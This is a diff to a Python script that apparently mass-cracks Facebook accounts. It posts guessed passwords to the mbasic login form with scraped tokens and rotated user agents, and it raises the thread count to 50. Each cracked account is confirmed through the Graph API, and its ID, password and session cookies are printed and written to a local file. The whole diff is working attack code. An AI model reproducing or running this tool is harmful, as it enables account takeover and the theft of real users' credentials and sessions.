@@ -481,7 +481,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=30) as heron:
+    with ThreadPool(max_workers=50) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -516,7 +516,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = Samsung()
+            uax = ua()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
@@ -557,12 +557,13 @@ def ren_sub(uid, pwx, meth, user, fb):
                 xx = coki.split("c_user=")[1]
                 xd = xx[:15]
                 res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
-                if "height" in res["data"]:
-                    print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}")
-                    open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
-                    oks.append(xd)
-                    break
-                else:
+                try:
+                    if "height" in res["data"]:
+                        print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies][spring_green1][[deep_pink2]{coki}")
+                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                        oks.append(xd)
+                        break
+                except KeyError:
                     pass
 
 
